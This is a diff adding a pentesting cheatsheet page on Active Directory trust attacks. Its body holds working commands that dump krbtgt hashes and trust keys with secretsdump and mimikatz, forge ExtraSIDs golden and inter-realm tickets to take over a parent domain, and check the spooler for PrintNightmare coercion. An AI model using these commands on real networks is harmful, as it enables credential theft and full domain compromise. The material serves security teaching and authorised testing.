@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Trust Attacks | JinPwn</title><meta name="description" content="Cross-domain and cross-forest attack paths. Once you have DA in a child domain, the parent (and the whole forest) is usually one ExtraSIDs trick away. Cross-forest attacks need more setup.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/active-directory/ad13-trust-attacks/">
+<meta property="og:title" content="Trust Attacks | JinPwn">
+<meta property="og:description" content="Cross-domain and cross-forest attack paths. Once you have DA in a child domain, the parent (and the whole forest) is usually one ExtraSIDs trick away. Cross-forest attacks need more setup.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad13-trust-attacks/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Trust Attacks | JinPwn">
+<meta name="twitter:description" content="Cross-domain and cross-forest attack paths. Once you have DA in a child domain, the parent (and the whole forest) is usually one ExtraSIDs trick away. Cross-forest attacks need more setup.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Cross-domain and cross-forest attack paths. Once you have DA in a child domain, the parent (and the whole forest) is usually one ExtraSIDs trick away. Cross-forest attacks need more setup.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Trust Attacks | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad13-trust-attacks/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Active Directory Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/active-directory/" class="cheatsheet-sidebar-section">Active Directory Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-sidebar-link">AD MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-sidebar-link">Enumeration</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-sidebar-link">BloodHound</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-sidebar-link">Kerberoasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-sidebar-link">AS-REP Roasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-sidebar-link">Password Spraying</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-sidebar-link">LLMNR &amp; NTLM Relay</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-sidebar-link">ACL Abuse</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-sidebar-link">Delegation</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-sidebar-link">ADCS ESC1-16</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-sidebar-link">Credential Dumping</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-sidebar-link">DCSync</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-sidebar-link is-current">Trust Attacks</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-sidebar-link">Persistence</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>Trust Attacks</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">Trust Attacks</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Active Directory Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/active-directory/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-mobile-sections-link">AD MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-mobile-sections-link">Enumeration</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-mobile-sections-link">BloodHound</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-mobile-sections-link">Kerberoasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-mobile-sections-link">AS-REP Roasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-mobile-sections-link">Password Spraying</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-mobile-sections-link">LLMNR &amp; NTLM Relay</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-mobile-sections-link">ACL Abuse</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-mobile-sections-link">Delegation</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-mobile-sections-link">ADCS ESC1-16</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-mobile-sections-link">Credential Dumping</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-mobile-sections-link">DCSync</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-mobile-sections-link is-current">Trust Attacks</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-mobile-sections-link">Persistence</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>Cross-domain and cross-forest attack paths. Once you have DA in a child domain, the parent (and the whole forest) is usually one ExtraSIDs trick away. Cross-forest attacks need more setup.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DC</span><span class="o">=</span>10.10.11.50
+</span></span><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;svc_user&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password1&#39;</span>
+</span></span></code></pre></div><h2 id="i-trust-types" data-heading-permalink="true"><span class="heading-content">i. Trust types</span>
+    <a class="heading-permalink" href="#i-trust-types" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Type</th>
+          <th>Direction</th>
+          <th>Notes</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Parent-Child</strong></td>
+          <td>Bidirectional, transitive</td>
+          <td>Default inside a forest. Most permissive.</td>
+      </tr>
+      <tr>
+          <td><strong>Tree-Root</strong></td>
+          <td>Bidirectional, transitive</td>
+          <td>Between two trees in the same forest.</td>
+      </tr>
+      <tr>
+          <td><strong>External</strong></td>
+          <td>One- or two-way, non-transitive</td>
+          <td>Between domains in different forests (or same).</td>
+      </tr>
+      <tr>
+          <td><strong>Forest</strong></td>
+          <td>One- or two-way, transitive</td>
+          <td>Between forest roots. SID filtering applied.</td>
+      </tr>
+      <tr>
+          <td><strong>Realm</strong></td>
+          <td>One- or two-way, transitive</td>
+          <td>Trust to a non-Windows Kerberos realm (Linux).</td>
+      </tr>
+      <tr>
+          <td><strong>Shortcut</strong></td>
+          <td>Optimization within a forest</td>
+          <td>No new attack surface.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="ii-enumerate-trusts" data-heading-permalink="true"><span class="heading-content">ii. Enumerate trusts</span>
+    <a class="heading-permalink" href="#ii-enumerate-trusts" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>bloodyAD as a tree:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get trusts
+</span></span><span class="line"><span class="cl"><span class="c1">## Follow trust chains across the forest:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get trusts --transitive
+</span></span></code></pre></div><p>nxc trust enumeration:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M enum_trusts
+</span></span></code></pre></div><p>LDAP filter:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(objectClass=trustedDomain)&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --attr trustPartner,trustDirection,trustType,trustAttributes,securityIdentifier
+</span></span></code></pre></div><p>PowerView:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-DomainTrust</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainTrustMapping</span> <span class="n">-API</span>           <span class="c">## walk the trust graph</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ForestTrust</span>
+</span></span></code></pre></div><p>Read the <code>trustDirection</code> and <code>trustAttributes</code> carefully:</p>
+<ul>
+<li><code>trustDirection</code>: 1=inbound, 2=outbound, 3=bidirectional</li>
+<li><code>trustAttributes</code>: bit flags. <code>TRUST_ATTRIBUTE_QUARANTINED_DOMAIN</code> (4) means SID filtering is enforced; <code>TRUST_ATTRIBUTE_WITHIN_FOREST</code> (32) means intra-forest.</li>
+</ul>
+<h2 id="iii-child-to-parent-extrasids--golden-ticket-with-ea-sid" data-heading-permalink="true"><span class="heading-content">iii. Child-to-Parent: ExtraSIDs / Golden Ticket with EA SID</span>
+    <a class="heading-permalink" href="#iii-child-to-parent-extrasids--golden-ticket-with-ea-sid" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Inside a forest, SID filtering is DISABLED for parent-child trusts. From a compromised child domain DA, you can forge a TGT that claims membership in the parent&rsquo;s Enterprise Admins group.</p>
+<h3 id="step-1-get-the-childs-krbtgt-hash-and-sid" data-heading-permalink="true"><span class="heading-content">Step 1: Get the child&rsquo;s krbtgt hash and SID</span>
+    <a class="heading-permalink" href="#step-1-get-the-childs-krbtgt-hash-and-sid" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator:<span class="nv">$PASS</span>@dc.corp.local
+</span></span><span class="line"><span class="cl"><span class="c1">## Note the NTLM hash of krbtgt and the child domain SID</span>
+</span></span><span class="line"><span class="cl">nxc ldap dc.corp.local -u Administrator -p <span class="nv">$PASS</span> --get-sid
+</span></span><span class="line"><span class="cl"><span class="c1">## Child SID: S-1-5-21-AAA-BBB-CCC</span>
+</span></span></code></pre></div><h3 id="step-2-get-the-enterprise-admins-sid-from-the-parent" data-heading-permalink="true"><span class="heading-content">Step 2: Get the Enterprise Admins SID from the parent</span>
+    <a class="heading-permalink" href="#step-2-get-the-enterprise-admins-sid-from-the-parent" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>The EA group lives in the FOREST ROOT domain. SID is <code>&lt;ROOT_DOMAIN_SID&gt;-519</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## If you can reach a DC in the parent:</span>
+</span></span><span class="line"><span class="cl">nxc ldap dc.root.local -u Administrator -p <span class="nv">$PASS</span> --get-sid
+</span></span><span class="line"><span class="cl"><span class="c1">## Parent SID: S-1-5-21-XXX-YYY-ZZZ</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Enterprise Admins SID: S-1-5-21-XXX-YYY-ZZZ-519</span>
+</span></span></code></pre></div><p>Without parent access, walk the trust to find the parent SID:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d corp.local -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(objectClass=trustedDomain)&#39;</span> --attr trustPartner,securityIdentifier
+</span></span></code></pre></div><h3 id="step-3-forge-a-golden-ticket-with-extrasids" data-heading-permalink="true"><span class="heading-content">Step 3: Forge a Golden Ticket with ExtraSIDs</span>
+    <a class="heading-permalink" href="#step-3-forge-a-golden-ticket-with-extrasids" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-ticketer -nthash <span class="nv">$CHILD_KRBTGT_NT</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain-sid S-1-5-21-AAA-BBB-CCC <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain corp.local <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -extra-sid S-1-5-21-XXX-YYY-ZZZ-519 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  Administrator
+</span></span><span class="line"><span class="cl"><span class="c1">## Output: Administrator.ccache</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</span></span><span class="line"><span class="cl"><span class="c1">## Now you&#39;re EA in the parent:</span>
+</span></span><span class="line"><span class="cl">impacket-secretsdump -k -no-pass root.local/Administrator@dc.root.local
+</span></span></code></pre></div><p>Mimikatz equivalent:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-AAA-BBB-CCC /krbtgt:CHILD_KRBTGT_NT /sids:S-1-5-21-XXX-YYY-ZZZ-519 /ptt
+</span></span></code></pre></div><div class="obsidian-callout callout-tip">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">Why this works</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>ExtraSIDs is the PAC field used for &ldquo;this user came from a trusted domain and has these extra group memberships.&rdquo; Inside a forest, parent DCs trust the SIDs verbatim. Outside (external trust with SID filtering enabled), the foreign SIDs get stripped.</p>
+  </div>
+</div>
+<h2 id="iv-cross-forest-with-sid-filtering" data-heading-permalink="true"><span class="heading-content">iv. Cross-Forest with SID filtering</span>
+    <a class="heading-permalink" href="#iv-cross-forest-with-sid-filtering" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Forest trusts apply SID filtering by default. ExtraSIDs values outside the trusted domain&rsquo;s namespace are stripped. But:</p>
+<ul>
+<li><strong>SID filtering exemption</strong> (<code>TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL</code> cleared) means trust is treated as transitive forest trust - ExtraSIDs still filtered</li>
+<li><strong>Selective Authentication</strong> further restricts which forest accounts can auth to forest resources</li>
+<li>When <code>Allow authentication across forest boundary</code> is enabled with both <code>Forest Trust</code> and <code>Selective Auth</code> off, you have wider movement</li>
+</ul>
+<p>Forest enumeration:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M enum_trusts
+</span></span><span class="line"><span class="cl"><span class="c1">## look for QuarantinedDomain=False on the trust</span>
+</span></span></code></pre></div><h2 id="v-foreign-security-principals-fsp" data-heading-permalink="true"><span class="heading-content">v. Foreign Security Principals (FSP)</span>
+    <a class="heading-permalink" href="#v-foreign-security-principals-fsp" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Cross-forest groups can have members from foreign domains. BloodHound shows these as FSP nodes. Common abuse:</p>
+<ul>
+<li>Foreign user added to Domain Admins of trusted forest (yes, this happens)</li>
+<li>Find via:</li>
+</ul>
+<pre tabindex="0"><code class="language-cypher" data-lang="cypher">MATCH (n:User)-[:MemberOf]-&gt;(g {name: &#39;DOMAIN ADMINS@OTHER.FOREST&#39;})
+WHERE n.domain &lt;&gt; &#39;OTHER.FOREST&#39;
+RETURN n.name, n.domain
+</code></pre><p>When a foreign user is in your DA, compromising them = DA on YOUR domain.</p>
+<h2 id="vi-trust-ticket-forging-inter-realm-tgt" data-heading-permalink="true"><span class="heading-content">vi. Trust ticket forging (Inter-realm TGT)</span>
+    <a class="heading-permalink" href="#vi-trust-ticket-forging-inter-realm-tgt" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Trust relationships work by sharing a Kerberos key. When you have the trust key, you can forge tickets that go to the trusted domain.</p>
+<p>Pull the trust key (it&rsquo;s a hash):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -just-dc-user <span class="s1">&#39;corp.local$&#39;</span> parent.local/Administrator:<span class="nv">$PASS</span>@dc.parent.local
+</span></span><span class="line"><span class="cl"><span class="c1">## or directly with mimikatz:</span>
+</span></span><span class="line"><span class="cl">mimikatz <span class="c1"># lsadump::trust /patch</span>
+</span></span></code></pre></div><p>Forge an inter-realm TGT for the trusted domain:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-ticketer -nthash <span class="nv">$TRUST_KEY</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain corp.local <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain-sid S-1-5-21-AAA-BBB-CCC <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -extra-sid S-1-5-21-XXX-YYY-ZZZ-519 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -spn <span class="s1">&#39;krbtgt/parent.local&#39;</span> Administrator
+</span></span></code></pre></div><p>Use the resulting ticket to request service tickets in the parent.</p>
+<h2 id="vii-cross-forest-credential-abuse-from-trust-key" data-heading-permalink="true"><span class="heading-content">vii. Cross-forest credential abuse from trust key</span>
+    <a class="heading-permalink" href="#vii-cross-forest-credential-abuse-from-trust-key" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you have the FOREST trust key (different from intra-forest parent-child), you can forge inter-realm TGTs:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Trust accounts look like: foreign_forest$</span>
+</span></span><span class="line"><span class="cl">impacket-secretsdump -just-dc-user <span class="s1">&#39;partner.com$&#39;</span> corp.local/Administrator:<span class="nv">$PASS</span>@dc.corp.local
+</span></span><span class="line"><span class="cl"><span class="c1">## Forge:</span>
+</span></span><span class="line"><span class="cl">impacket-ticketer -nthash <span class="nv">$TRUST_KEY</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain corp.local -domain-sid SID_CORP <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -spn <span class="s1">&#39;krbtgt/partner.com&#39;</span> Administrator
+</span></span></code></pre></div><p>The PAC will be subject to SID filtering on the partner side, so ExtraSIDs may be stripped. But the basic identity claim survives, enabling lateral access to whatever your forged user can normally access.</p>
+<h2 id="viii-trust-direction-matters" data-heading-permalink="true"><span class="heading-content">viii. Trust direction matters</span>
+    <a class="heading-permalink" href="#viii-trust-direction-matters" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>You&rsquo;re in DOMAIN A, trust is &ldquo;A trusts B&rdquo; (A is trusting, B is trusted):</p>
+<ul>
+<li>Users in B can authenticate to resources in A</li>
+<li>Users in A CANNOT authenticate to B</li>
+<li><strong>Attack direction</strong>: compromise B, move INTO A</li>
+</ul>
+<p>You&rsquo;re in DOMAIN A, trust is &ldquo;A trusted by B&rdquo; (bidirectional default):</p>
+<ul>
+<li>Users in both can auth across</li>
+<li><strong>Attack direction</strong>: either way</li>
+</ul>
+<p>Always check <code>trustDirection</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(objectClass=trustedDomain)&#39;</span> --attr trustPartner,trustDirection
+</span></span></code></pre></div><h2 id="ix-multi-domain-forest-enumeration-shortcut" data-heading-permalink="true"><span class="heading-content">ix. Multi-domain forest enumeration shortcut</span>
+    <a class="heading-permalink" href="#ix-multi-domain-forest-enumeration-shortcut" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Use the Global Catalog (GC) to query across all forest domains from any DC:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> --gc get search <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --filter <span class="s1">&#39;(objectClass=user)&#39;</span> --attr samaccountname,memberOf
+</span></span></code></pre></div><p><code>--gc</code> connects to port 3268 (or 3269 with <code>-s</code>). Queries return forest-wide results, not just current domain.</p>
+<h2 id="x-printnightmare-cross-forest" data-heading-permalink="true"><span class="heading-content">x. PrintNightmare cross-forest</span>
+    <a class="heading-permalink" href="#x-printnightmare-cross-forest" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>PrintNightmare (CVE-2021-34527) works across trust boundaries if you can reach the target DC. Useful chain:</p>
+<ul>
+<li>You have low-priv in domain A</li>
+<li>Forest trust to domain B exists, bidirectional</li>
+<li>B&rsquo;s DC has Spooler running</li>
+<li>Coerce B&rsquo;s DC via PrintNightmare, relay to ADCS or somewhere</li>
+</ul>
+<p>Spooler running check:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb dc.partner.com -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M spooler
+</span></span></code></pre></div><h2 id="xi-azuread--on-prem-hybrid" data-heading-permalink="true"><span class="heading-content">xi. AzureAD / on-prem hybrid</span>
+    <a class="heading-permalink" href="#xi-azuread--on-prem-hybrid" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
